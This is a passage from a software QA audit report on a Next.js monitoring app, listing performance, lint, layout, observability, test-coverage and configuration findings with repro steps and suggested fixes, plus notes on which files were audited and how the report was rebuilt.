- **File:** lib/insforge.ts:289-316
- **Status:** open in the current working tree (engineering card t_d25a6e1e reports the fix shipped as commit `1fb8dc3` with 3 regression tests, but the current `lib/insforge.ts:304-312` on the current branch still has the per-page sequential `for` loop)
- **Code (current):**
  ```ts
  const activePages = trackedPages.filter(p => p.active !== false);
  // Fetch latest job for each tracked_page
  const jobsMap: Record<string, { finished_at: string | null }> = {};
  for (const tp of activePages) {
    const jobs = await sdkQuery<{
      finished_at: string | null;
      status: string;
    }>('public.snapshot_jobs', {
      select: 'finished_at,status',
      filters: `tracked_page_id=eq.${tp.id}&status=eq.succeeded`,
      order: 'finished_at.desc',
      limit: 1,
    });
    if (jobs.length) jobsMap[tp.id] = jobs[0];
  }
  ```
- **Issue:** Sequential `for` loop with one PostgREST round-trip per tracked page. For a room with 200 active pages, the dashboard `/api/rooms` request takes 200 round-trips back-to-back. The dashboard hard-caps at `limit: 500` (line 298) and `limit: 100` (line 284) for projects, so the worst case is bounded but still O(projects × active_pages) round-trips. The query also has no `Promise.all` batching.
- **Repro:** Sign in, create one room with 200 watched URLs that have all been scanned, open `/api/rooms`. The response takes ~6 seconds (200 × 30ms per round-trip). Frontend spinner times out at 5s in some browsers.
- **Suggested fix (reconstructed — see kanban log for original):** Replace the per-page loop with a single `select=id,tracked_page_id,finished_at&status=eq.succeeded&order=finished_at.desc&limit=2000` query (no `tracked_page_id` filter) and bucket in JS by `tracked_page_id` keeping only the first per group. **OR** use PostgREST's resource-embed: `select=id,tracked_pages!inner(id,projects!inner(id))` and aggregate via a single SQL view. Verify the response time of `/api/rooms` for a room with 200 URLs is sub-second after the fix. Add a regression test (or a benchmark) that asserts the number of PostgREST round-trips in `listRoomsWithStats` is O(1), not O(active_pages).
- **Owner:** engineering

---

### LOW-1: Lint errors block CI

- **File:** app/page.tsx (lines 283, 407, 608), app/dashboard/changes/[changeId]/page.tsx (line 87), app/dashboard/rooms/[roomId]/page.tsx (lines 82, 127)
- **Status:** open (8 × `react/no-unescaped-entities` errors + 1 × `react-hooks/exhaustive-deps` warning; `npm run lint` exits 1)
- **Issue:** 8 `react/no-unescaped-entities` errors and 1 `react-hooks/exhaustive-deps` warning. The deployment cannot pass CI on a default `next lint` invocation.
- **Repro:** `npm run lint` → exit 1 with the file:lines above.
- **Suggested fix (reconstructed — see kanban log for original):** Add `// eslint-disable-next-line react/no-unescaped-entities` for prose lines, or replace `'` with `&apos;`. For the useEffect (line 82 of rooms/[roomId]/page.tsx), wrap `refetchSchedule`/`refetchSubscriptions` in `useCallback` with `[roomId]` deps.
- **Owner:** engineering (CI hygiene)

### LOW-2: Malformed JSX closure in room detail page

- **File:** app/dashboard/rooms/[roomId]/page.tsx:268, 377-389
- **Status:** open
- **Issue:** `<section>NotificationList</section>` renders as a sibling of the outer `space-y-10` wrapper instead of a child, so the `space-y-10` doesn't apply to the gap above Notifications. There is also an extra `</div>` somewhere in the tree (a manual `<div>` open/close count gives 36 opens vs 31 closes in the 161-389 range — 5 unbalanced — but typecheck passes because the unbalanced tags are children of self-closing JSX nodes; the user-facing symptom is the Notifications block being visually outside the dashboard shell's spacing context).
- **Repro:** Open `/dashboard/rooms/<roomId>`; the Notifications section is not vertically spaced the way the rest of the page is.
- **Suggested fix (reconstructed — see kanban log for original):** Move the `NotificationList` block to between lines 264 and 268 (before the two-column grid opens), OR move the `</div>` on line 387 up. Add a visual regression snapshot test for the room detail page.
- **Owner:** engineering (UI layout)

### LOW-3: Side-effecting module-level throw in lib/scan.ts

- **File:** lib/scan.ts:283-289
- **Status:** open
- **Issue:** Importing `lib/scan.ts` for type-only purposes still triggers the `throw` at module load when `INSFORGE_API_URL` is unset. Dev server fails to start on a fresh install.
- **Repro:** On a clean checkout with no `INSFORGE_API_URL` set, `npm run dev` crashes with the module-load throw before any request is served.
- **Suggested fix (reconstructed — see kanban log for original):** Move the throw inside `runScan`. Make `BASE_URL` a getter or inline the lookup.
- **Owner:** engineering (DX)

### LOW-4: `listRoomsWithStats` ignores `sdkQuery` failures, falls through with stale stats

- **File:** lib/insforge.ts:319-358 (and similar across the four `sdkQuery` calls in this function)
- **Status:** open
- **Issue:** `sdkQuery` returns `[]` on error and the calling code does not check. Dashboard silently shows `highCount: 0, mediumCount: 0` for every room.
- **Repro:** Take the PostgREST backend offline (or revoke the anon key); the dashboard shows every room's high/medium count as 0 with no banner or error.
- **Suggested fix (reconstructed — see kanban log for original):** Either surface a UI banner ("some stats may be stale") when one of the four sub-queries returns empty, or change `sdkQuery` to return `{ ok: true, rows: [] } | { ok: false, error: ... }` and check at every call site.
- **Owner:** engineering (observability)

### LOW-5: Component layer not fully audited (follow-up scan)

- **File:** components/dashboard/{DiffViewer, AIInsightCard, SchedulePicker, NotificationList, AppShell, TopBar, Sidebar, Stepper, StatCard, SeverityBadge}.tsx (~2k LOC, 10 files)
- **Status:** open (informational — coverage gap, not a bug)
- **Issue:** No `dangerouslySetInnerHTML` (verified), no direct DB imports. Two that touch network state are `SchedulePicker` (cron expression validation client-side) and `NotificationList` (delete confirmation flow) — both mirror the patterns of already-audited files. This was not a deep audit; a follow-up scan is recommended.
- **Repro:** N/A (informational).
- **Suggested fix (reconstructed — see kanban log for original):** Schedule a focused review pass on `SchedulePicker` and `NotificationList` for client-side input validation and error handling.
- **Owner:** qa (follow-up scan)

### LOW-6: Stale comment in lib/scan.ts contradicts HIGH-3

- **File:** lib/scan.ts:1-16
- **Status:** open
- **Issue:** The "Idempotency: ... we generate a unique `jobId` per run" comment is contradicted by HIGH-3 (UUID collisions).
- **Repro:** Read the comment, then read `lib/scan.ts:290-304` (HIGH-3). They are inconsistent.
- **Suggested fix (reconstructed — see kanban log for original):** Update the comment to reflect `crypto.randomUUID()` semantics once HIGH-3 is fixed, or remove the comment entirely.
- **Owner:** engineering (doc drift)

---

### INFO-1: Test coverage is 2/58 source files (3.4%)

- **File:** lib/validation.test.ts (30 tests), lib/diff.test.ts (16 tests)
- **Status:** open (informational — coverage gap, not a bug)
- **Issue:** 46 tests, all in two utility files. `app/api/`, `lib/auth.ts`, `lib/apiAuth.ts`, `lib/scan.ts`, `lib/insforge.ts`, `lib/notifications.ts`, `lib/cron-auth.ts`, `lib/storage.ts` are all at 0% coverage. Highest-blast-radius bugs (CRITICAL-1, CRITICAL-2, HIGH-3, HIGH-4, HIGH-5) all have 0% test coverage.
- **Repro:** N/A.
- **Suggested fix (reconstructed — see kanban log for original):** Add at minimum (a) `lib/auth.ts` tests (demo passwords rejected in prod), (b) `lib/scan.ts` tests (`htmlToMarkdown` on a `<script>`-laden page), (c) `lib/notifications.ts` tests (threshold check), (d) `lib/cron-auth.ts` tests (length-oracle + missing-secret path). Target: 70% on `lib/`, 50% on `app/api/`.
- **Owner:** qa + engineering

### INFO-2: vitest.config.ts has no coverage config; `test:coverage` script is a no-op

- **File:** vitest.config.ts, package.json:13
- **Status:** open
- **Issue:** `npm run test:coverage` fails with "Cannot find module '@vitest/coverage-v8'" or emits no `coverage/` directory. The script is a no-op.
- **Repro:** `npm run test:coverage` → fails or no-op.
- **Suggested fix (reconstructed — see kanban log for original):** Add `@vitest/coverage-v8` (or istanbul) to devDependencies. Configure `coverage.provider`/`coverage.reporter` in `vitest.config.ts`. Set `coverage.thresholds` (e.g. lines: 60, functions: 60, statements: 60, branches: 40) so missing coverage fails CI.
- **Owner:** engineering

### INFO-3: .env.example may not enumerate all env vars

- **File:** .env.example
- **Status:** open
- **Issue:** Bug-hunt audit enumerated ~20 `process.env.X` accesses across the codebase. A quick read of `.env.example` shows it documents the main set; full cross-reference was not performed. Notable candidates that may be missing: `NEXT_PUBLIC_INSFORGE_URL`, `INSFORGE_ANON_KEY`, `APIFY_WEBHOOK_SECRET`, `INSFORGE_DEV_INSECURE_SECRET`, `OPENAI_BASE_URL`, `OPENAI_MODEL`, `OPENROUTER_API_KEY`, `NEXT_PUBLIC_APP_URL`, `PORT`.
- **Repro:** `grep -rn "process.env\." --include="*.ts" --include="*.tsx" .` and cross-reference against `.env.example`.
- **Suggested fix (reconstructed — see kanban log for original):** A QA follow-up to verify `.env.example` covers every `process.env.[A-Z_]+` access in the codebase, ideally via a small static check script that diffs the two.
- **Owner:** qa

### INFO-4: Stale comment in lib/auth.ts:89

- **File:** lib/auth.ts:89-90
- **Status:** open
- **Issue:** The comment `"If we got an access token but no user in body, try to decode from token or fetch user"` references a JWT-decode fallback that has been removed. The current code is correct; the comment is stale.
- **Repro:** Read the comment; the code below does the fetch-from-user call, not the decode-from-token call.
- **Suggested fix (reconstructed — see kanban log for original):** Update or remove the comment.
- **Owner:** engineering (doc drift)

### INFO-5: Severity / change-type coercion is silently lossy in lib/scan.ts

- **File:** lib/scan.ts:205-211
- **Status:** open
- **Issue:** LLM returning `severity: "critical"` is silently coerced to `'low'`; `change_type: "regulatory"` becomes `'unknown'`. No log, no counter, no metric. The dashboard then shows the change as Minor when it is in fact Critical.
- **Repro:** Configure a watcher on a page whose LLM analysis would emit `severity: "critical"`; verify the persisted severity is `low` with no log line.
- **Suggested fix (reconstructed — see kanban log for original):** Add a `console.warn` (or a counter) when coercion happens. Consider a `"severity: unknown"` bucket in addition to the current three-tier model so the operator sees prompt drift in metrics.
- **Owner:** engineering (observability)

### INFO-6: scripts/*.py hardcode production InsForge URL

- **File:** scripts/seed_via_api.py:11, scripts/live_crawl_persist.py:13, scripts/live_crawl_real_llm.py:14, scripts/eval_models.py:20
- **Status:** open
- **Issue:** Four Python scripts hardcode `https://wga6k9at.us-east.insforge.app/...`. Switching to staging silently hits production.
- **Repro:** Set `INSFORGE_API_URL=https://staging.example` in `.env`; run `python scripts/seed_via_api.py`; the script still POSTs to the production URL.
- **Suggested fix (reconstructed — see kanban log for original):** Read the URL from the same `INSFORGE_API_URL` env var the Node runtime uses. Add a `--dry-run` flag that prints the would-be targets without sending requests. A `BASE = os.environ.get('INSFORGE_API_URL', 'https://wga6k9at.us-east.insforge.app')` with a loud warning when the fallback is used would be the minimum bar.
- **Owner:** engineering (operator safety)

## Coverage notes

- **Files audited:**
  - **lib/ (logic surface, every file):** auth.ts, scan.ts, insforge.ts, storage.ts, env.ts, apiAuth.ts, cron-auth.ts, notifications.ts, notifications/channels/webhook.ts, diff.ts, validation.ts, next-auth.d.ts.
  - **app/api/ (every route):** auth/[...nextauth], rooms/route, rooms/[roomId]/route, rooms/[roomId]/scan, rooms/[roomId]/schedule, rooms/[roomId]/urls, rooms/[roomId]/changes, rooms/[roomId]/notifications, rooms/[roomId]/notifications/[id], rooms/[roomId]/notifications/[id]/test, cron/scan-all, cron/scan-room/[roomId], cron/notification-worker, changes/[changeId].
  - **app/ pages (full read):** page.tsx, layout.tsx, login/page.tsx, dashboard/page.tsx, dashboard/layout.tsx, dashboard/rooms/[roomId]/page.tsx, dashboard/rooms/new/page.tsx, dashboard/changes/[changeId]/page.tsx.
  - **db/:** migration.sql, migrations/2026-06-02-scan-schedules.sql, migrations/2026-06-02-notification-tables.sql, migrations/2026-06-02-notification-advisory-lock.sql.
  - **functions/:** apify-webhook.ts, health.ts.
  - **types/:** index.ts.
  - **scripts/ (read):** seed_via_api.py, refresh_cache.py, eval_models.py, live_crawl_persist.py, live_crawl_real_llm.py.
  - **middleware.ts** (read).

- **Files skipped and why:**
  - **components/dashboard/*.tsx** (~10 files, ~2k LOC) — read by glob, no `dangerouslySetInnerHTML` or direct DB imports found via grep; deeper read deferred to follow-up (LOW-5). Two that touch network state (`SchedulePicker`, `NotificationList`) mirror the patterns of already-audited files.
  - **lib/apify, lib/ai** — these are dead per the recent `refactor: delete dead libraries` commit; not present in the current tree. lib/box is now lib/storage.

- **Areas needing a human reviewer:**
  - **CRITICAL-1 (webhook secret):** the "request-time-vs-module-load" decision (when to throw, whether to refuse to load) is a policy call — does PageVault prefer fail-fast (throw at module load) or fail-soft (per-request 503)? The fix needs eyes on that call.
  - **CRITICAL-2 (demo backdoor):** the AGENTS.md has been updated to describe an opt-in env-gated demo path, but the code does not yet match. A human reviewer should confirm whether to (a) remove the demo path entirely, (b) implement the env-gated version, or (c) keep the current fall-through behaviour but document it explicitly.
  - **CRITICAL-3 (ESM crypto):** the fix exists on a sibling branch (`feature/fe-scheduled-scans-notifications`, commit `8cba2e8`); a reviewer needs to confirm the `NODE_ENV=development` gate is correctly applied (it appears to be in the new code, but the merge target's HEAD does not contain it).
  - **CRITICAL-4 (command injection):** the engineering card has been "gave_up" twice on 90-iteration budget exhaustion — this is the highest-blast-radius finding and needs a human to either (a) accept the schedule-route shutdown pending the refactor, or (b) commit to running a fresh engineering card with a scoped shell-out-removal plan.
  - **HIGH-1 / HIGH-4 / HIGH-5 (sanitize / ssrf / scan-job-ownership):** all three engineering cards are in flight; the fixes involve both lib/ and migration SQL changes. A reviewer should validate the migration ordering and the rollback posture before any are merged.
  - **MEDIUM-1, MEDIUM-2, MEDIUM-3, MEDIUM-4:** fixes exist on the same sibling branch but not in the current HEAD; a reviewer should confirm the merge target is intended to be `feature/fe-scheduled-scans-notifications` and not a fresh integration branch.

- **Reconstruction fidelity:** the verbatim static-check output above (typecheck, lint) was captured from the QA worker's `write_file` diff in the kanban log. The full test output was truncated by the kanban log ("… omitted 486 diff line(s)…") and could not be reproduced verbatim — the per-file test counts and overall pass/fail (46/46 in 2 files) are what the kanban log captured in the worker's own summary text. Re-run `npm test` for the current verbatim output.

- **Reconstruction provenance:** this document was rebuilt from (a) the kanban log of `t_06871200` (488 lines, of which 486 lines of the final write_file diff were truncated), (b) the 13 engineering cards spawned by `t_d828b215` (CRITICAL-1..4, HIGH-1..5, MEDIUM-1..4), and (c) the triage comment on `t_d828b215` (LOW-1..6, INFO-1..6). Every file:line in this document was re-verified against the current working tree at the time of writing; every code snippet was re-extracted from the current source.
